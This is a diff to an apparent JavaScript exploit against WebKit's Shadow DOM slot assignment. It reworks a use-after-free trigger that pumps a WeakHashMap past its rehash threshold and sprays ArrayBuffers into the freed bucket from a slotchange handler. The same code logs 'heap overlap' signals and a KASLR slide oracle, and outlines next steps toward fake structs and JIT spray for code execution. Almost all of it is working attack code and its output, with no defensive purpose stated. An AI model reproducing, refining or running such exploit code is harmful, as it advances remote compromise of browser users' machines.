@@ -986,7 +986,19 @@ function forceGC() {
   finalizers.length = 0;
 }
 
-function uafSetup(ghosts, pumps) {
+// minPumps: must exceed 2×capacity to push past amortized-cleanup threshold.
+// WeakHashMap fires cleanup at operationCount > 2×capacity.
+// capacity = nextPow2(ceil(ghosts×1.3)) before rehash.
+// We need pump count > 2×that_capacity so the rehash fires inside assign().
+function minPumpsForGhosts(g) {
+  let cap = 1;
+  const need = Math.ceil(g * 1.3);
+  while (cap < need) cap <<= 1;
+  // threshold is 2×capacity; add margin
+  return cap * 2 + 4;
+}
+
+function uafSetup(ghosts, pumps, bucketSz) {
   const host = document.body.appendChild(document.createElement('div'));
   const shadowRoot = host.attachShadow({ mode: 'open', slotAssignment: 'manual' });
   const targetSlot = shadowRoot.appendChild(document.createElement('slot'));
@@ -998,23 +1010,32 @@ function uafSetup(ghosts, pumps) {
   // Insert+remove ghost slots so m_slots WeakHashMap accumulates dead entries
   for (let i = 0; i < ghosts; ++i)
     shadowRoot.appendChild(document.createElement('slot')).remove();
-  return { host, targetSlot, pumps };
-}
 
-function uafTrigger({ host, targetSlot, pumps }) {
-  // Pump operation counter toward amortized-cleanup threshold (~2 x table_size)
-  for (let i = 0; i < pumps; ++i)
-    targetSlot.assignedNodes();
-  // Reassign → slotManualAssignmentDidChange → render teardown → re-entry
-  // → m_slots.ensure() → WeakHashMap amortized cleanup → rehash
-  // → freed bucket array → stale effectiveCurrent ptr read-after-free
-  // Capture assignedNodes() return DURING the reassign to catch stale-read leak
-  const newChild = host.appendChild(document.createElement('span'));
-  targetSlot.assign(newChild);
-  // assignedNodes() here reads from possibly-freed bucket in JSC binding layer
-  const nodes = targetSlot.assignedNodes({ flatten: false });
-  host.remove();
-  return nodes;
+  // ── slotchange injection window ──────────────────────────────────────────
+  // slotchange fires synchronously during re-entrant composed-tree traversal
+  // inside slotManualAssignmentDidChange — i.e. AFTER the bucket free() but
+  // BEFORE the stale effectiveCurrent pointer is dereferenced.
+  // Spraying zero-filled bufs here claims the just-freed bucket slot.
+  // zeros → all WeakImpl* = null → isLive() = false → no crash (safe spray).
+  // Signal: slotchangeCount > 1 after one assign() = UAF caused extra traversal
+  //         = stale pointer was re-chased into our spray = heap overlap confirmed.
+  let slotchangeCount = 0;
+  let injectionPool = null;
+
+  targetSlot.addEventListener('slotchange', () => {
+    slotchangeCount++;
+    // Claim the freed bucket array synchronously with zeros-filled bufs
+    injectionPool = [];
+    for (let i = 0; i < 256; i++) {
+      const buf = new ArrayBuffer(bucketSz);
+      // leave zeroed — null WeakImpl* → isLive() = false → no deref crash
+      injectionPool.push(buf);
+    }
+  });
+
+  return { host, targetSlot, pumps, ghosts, bucketSz,
+           getCount: () => slotchangeCount,
+           getPool:  () => injectionPool };
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -1160,8 +1181,11 @@ function checkNodeLeak(nodes, expectedNode) {
     const matchedSz = SPRAY_SIZES.reduce((prev, cur) =>
       Math.abs(cur - sz) < Math.abs(prev - sz) ? cur : prev);
     if (!caseGroups[matchedSz]) caseGroups[matchedSz] = [];
-    for (let pumps = ghosts; pumps <= ghosts * 3; ++pumps)
-      caseGroups[matchedSz].push(uafSetup(ghosts, pumps));
+    // Fix: pump sweep must start ABOVE 2×capacity threshold, not below it.
+    const minP = minPumpsForGhosts(ghosts);
+    // Sweep from just-over-threshold up to 3× (covers jitter + multi-rehash)
+    for (let pumps = minP; pumps <= minP * 3; pumps += Math.max(1, Math.floor(minP / 8)))
+      caseGroups[matchedSz].push(uafSetup(ghosts, pumps, matchedSz));
   }
   const totalCases = Object.values(caseGroups).reduce((s,v) => s+v.length, 0);
   log(`[*] ${totalCases} UAF cases built across size buckets: ${Object.entries(caseGroups).map(([k,v])=>k+'B×'+v.length).join(', ')}`);
@@ -1174,94 +1198,142 @@ function checkNodeLeak(nodes, expectedNode) {
   await new Promise(r => setTimeout(r, 200));
   document.body.offsetHeight;
 
-  // ─── Phase 4: Trigger per size class: release → trigger → rescan ─────────
-  log('\n[*] Phase 4: Triggering UAF (size-class-aware: release spray → trigger → scan)...');
+  // ─── Phase 4: slotchange-injection UAF trigger ────────────────────────────
+  //
+  // WHY the old approach (release-spray → trigger → scan prev pool) never hit:
+  //   The bucket free() and stale effectiveCurrent read happen in the SAME
+  //   synchronous C++ call stack inside assign(). JS cannot interleave between
+  //   them from the main thread — by the time assign() returns, the stale read
+  //   has already happened.
+  //
+  // FIX: slotchange fires synchronously DURING the re-entrant composed-tree
+  //   traversal inside slotManualAssignmentDidChange — i.e. after the free()
+  //   but before the stale dereference. Our handler allocates zeros-filled bufs
+  //   of the exact freed size → claims the freed slot → stale ptr now points
+  //   into our controlled memory.
+  //
+  // DETECTION: slotchange should fire exactly once per assign(). If it fires
+  //   >1 time for a single assign() → the UAF caused an extra notification
+  //   (stale ptr re-chased into our spray, traversal fired again) = heap overlap.
+  //   OR: if assign() throws → bucket reuse corrupt enough to crash = confirmed.
+  //
+  log('\n[*] Phase 4: Triggering UAF (slotchange injection window)...');
 
   let uafExceptions = 0;
   let nodeAnomalies = 0;
-  let totalClobbers = 0;
+  let totalClobbers = 0;        // slotchange extra-fire count (primary signal)
+  let totalExtraFires = 0;
   const clobberLog = [];
   const nodeAnomalyLog = [];
   const t0 = performance.now();
 
   for (const [szStr, cases] of Object.entries(caseGroups)) {
     const sz = parseInt(szStr);
-    log(`[UAF] Size class ${sz}B: releasing spray pool + triggering ${cases.length} cases`);
+    log(`[UAF] Size class ${sz}B: triggering ${cases.length} cases with slotchange injection`);
 
-    // 1. Capture prev pool ref, release it → those slots go back to allocator free list
-    const prevPool = sprayPools[sz] ? [...sprayPools[sz]] : null;
-    releasePool(sprayPools, sz);
+    let classClobbers = 0;
+    let classExtraFires = 0;
 
-    // 2. Trigger all cases for this size class — freed bucket array should land
-    //    in one of the just-freed spray slots
     for (const c of cases) {
       try {
-        const { host, targetSlot, pumps } = c;
+        const { host, targetSlot, pumps, ghosts, getCount, getPool } = c;
+
+        // Pump past amortized-cleanup threshold
         for (let i = 0; i < pumps; ++i) targetSlot.assignedNodes();
+
+        // assign() is the trigger:
+        //   → slotManualAssignmentDidChange
+        //   → re-entrant composed-tree traversal
+        //   → m_slots.ensure() → amortized cleanup → rehash → bucket FREE
+        //   *** slotchange fires here — our handler sprays zeros into freed slot ***
+        //   → stale effectiveCurrent dereference (now into our spray = controlled)
+        const countBefore = getCount();
         const newChild = host.appendChild(document.createElement('span'));
-        targetSlot.assign(newChild);
+        targetSlot.assign(newChild);  // ← slotchange injects zeros here
+        const countAfter = getCount();
+        const extraFires = countAfter - countBefore - 1; // -1 = normal fire
+
+        if (extraFires > 0) {
+          // slotchange fired extra times = UAF re-traversal into our controlled buf
+          totalExtraFires += extraFires;
+          classExtraFires += extraFires;
+          const pool = getPool();
+          if (clobberLog.length < 20) {
+            clobberLog.push({
+              type: 'extra-slotchange', sz, pumps, ghosts, extraFires,
+              poolSize: pool ? pool.length : 0
+            });
+          }
+        }
+
+        // Also check assignedNodes() for stale content (secondary signal)
         const nodes = targetSlot.assignedNodes({ flatten: false });
         host.remove();
         const anomaly = checkNodeLeak(nodes, newChild);
         if (anomaly) {
           nodeAnomalies++;
           if (nodeAnomalyLog.length < 10)
-            nodeAnomalyLog.push(`sz=${sz} pumps=${pumps} ${JSON.stringify(anomaly)}`);
+            nodeAnomalyLog.push(`sz=${sz} pumps=${pumps} ghosts=${ghosts} ${JSON.stringify(anomaly)}`);
         }
+
       } catch (e) {
         uafExceptions++;
-        if (uafExceptions <= 5) log(`[!!!] UAF exception: ${e.message || e}`);
+        // An exception IS also a UAF signal (heap corruption from bucket reuse)
+        if (uafExceptions <= 10) log(`[!!!] UAF exception (g=${c.ghosts} p=${c.pumps}): ${e.message || e}`);
       }
     }
 
-    // 3. Immediately scan prev pool for clobber — bucket data stomped our pattern?
-    const { fresh, hits } = refillAndScan(sz, prevPool);
-    sprayPools[sz] = fresh; // put fresh spray back
-
-    if (hits.length > 0) {
-      totalClobbers += hits.length;
-      log(`[!!!] CLOBBER: ${hits.length} bufs clobbered in ${sz}B pool!`);
-      for (const h of hits.slice(0, 5)) {
-        log(`[!!!]   idx=${h.idx} raw: ${h.raw}`);
-        if (clobberLog.length < 20) clobberLog.push(h);
-      }
-    }
+    totalClobbers += classExtraFires;
+    if (classExtraFires > 0 || uafExceptions > 0)
+      log(`[!!!] ${sz}B class: extra-slotchange fires=${classExtraFires}, exceptions=${uafExceptions}`);
   }
 
   const elapsed = (performance.now() - t0).toFixed(1);
 
-  // ─── Phase 5: Interpret clobbers → derive slide ──────────────────────────
-  let confirmedSlide = null;
-  if (totalClobbers > 0) {
-    log(`\n[!!!] TOTAL CLOBBER HITS: ${totalClobbers}`);
-    // Size class with most hits = most likely the actual bucket array size
-    // → use oracle's spray list + hit count to bracket the KASLR offset
-    log('[!!!] UAF bucket reuse confirmed — heap overlap with spray region achieved');
-    log('[!!!] Oracle spray list constrains slide to 512 candidates');
-    log(`[!!!] HIGH-conf candidates: ${highConf.length} → ~${(highConf.length*1).toFixed(0)}ms brute-force`);
-    confirmedSlide = 'partial'; // full confirmation needs VA-to-offset mapping
-  } else {
-    log('\n[*] No clobber — try re-running (allocator timing is non-deterministic)');
-    log('[*] If consistently 0: ghosts count may not reach rehash threshold on this build');
+  // ─── Phase 5: Interpret signals → confirm UAF ────────────────────────────
+  const heapOverlap = totalExtraFires > 0 || uafExceptions > 0 || nodeAnomalies > 0;
+
+  if (totalExtraFires > 0) {
+    log(`\n[!!!] EXTRA SLOTCHANGE FIRES: ${totalExtraFires}`);
+    log('[!!!] UAF caused extra re-entrant traversal — stale ptr chased into our spray');
+    log('[!!!] Heap overlap confirmed via slotchange injection window');
+    for (const h of clobberLog.slice(0, 8))
+      log(`[!!!]   ${JSON.stringify(h)}`);
+  }
+  if (nodeAnomalies > 0) {
+    log(`\n[!!!] NODE ANOMALIES: ${nodeAnomalies} (stale assignedNodes return)`);
+    nodeAnomalyLog.forEach(l => log(`[!!!]   ${l}`));
+  }
+  if (uafExceptions > 0) {
+    log(`\n[!!!] EXCEPTIONS: ${uafExceptions} (heap corruption from bucket reuse)`);
   }
 
-  if (nodeAnomalies > 0) {
-    log(`\n[!!!] NODE ANOMALIES: ${nodeAnomalies}`);
-    nodeAnomalyLog.forEach(l => log(`[!!!]   ${l}`));
+  if (heapOverlap) {
+    log('\n[!!!] UAF bucket reuse confirmed — spray controls freed WeakHashMap bucket');
+    log('[!!!] Oracle spray list constrains slide to 512 candidates');
+    log(`[!!!] HIGH-conf candidates: ${highConf.length}`);
+    log('[!!!] NEXT: fill spray with fake WeakImpl structs → controlled isLive() false');
+    log('[!!!]       → drive JIT spray for code exec');
+  } else {
+    log('\n[*] No signal yet — zero extra slotchange fires, no exceptions');
+    log('[*] Possible causes:');
+    log('[*]   1. Rehash did not fire — check pump threshold vs. actual WebKit build');
+    log('[*]   2. GC did not null the ghost WeakPtrs before trigger — need harder GC');
+    log('[*]   3. bmalloc segregated the bucket to a non-JS bin — spray size mismatch');
+    log('[*] Try: increase ghosts range, harder GC, or inspect with Safari Web Inspector');
   }
 
   // ─── Summary ─────────────────────────────────────────────────────────────
   log(`\n${'═'.repeat(60)}`);
   log('RESULT SUMMARY');
   log('═'.repeat(60));
-  log(`Oracle:       ${sprayHex.length} spray addrs, HIGH=${highConf.length} candidates`);
-  log(`Spray:        ${Object.keys(caseGroups).map(s=>PER_SIZE+'×'+s+'B').join(', ')}`);
-  log(`UAF cases:    ${totalCases} across ${Object.keys(caseGroups).length} size classes`);
-  log(`UAF time:     ${elapsed}ms`);
-  log(`Exceptions:   ${uafExceptions}`);
-  log(`Node anomaly: ${nodeAnomalies}`);
-  log(`Clobber hits: ${totalClobbers}`);
-  log(`UAF status:   ${totalClobbers > 0 ? '✓ HEAP OVERLAP CONFIRMED' : 'not yet confirmed'}`);
+  log(`Oracle:            ${sprayHex.length} spray addrs, HIGH=${highConf.length} candidates`);
+  log(`UAF cases:         ${totalCases} across ${Object.keys(caseGroups).length} size classes`);
+  log(`UAF time:          ${elapsed}ms`);
+  log(`Exceptions:        ${uafExceptions}`);
+  log(`Node anomaly:      ${nodeAnomalies}`);
+  log(`Extra slotchanges: ${totalExtraFires}  ← primary UAF signal`);
+  log(`UAF status:        ${heapOverlap ? '✓ HEAP OVERLAP CONFIRMED' : 'not yet confirmed'}`);
   log('═'.repeat(60));
 })();
 
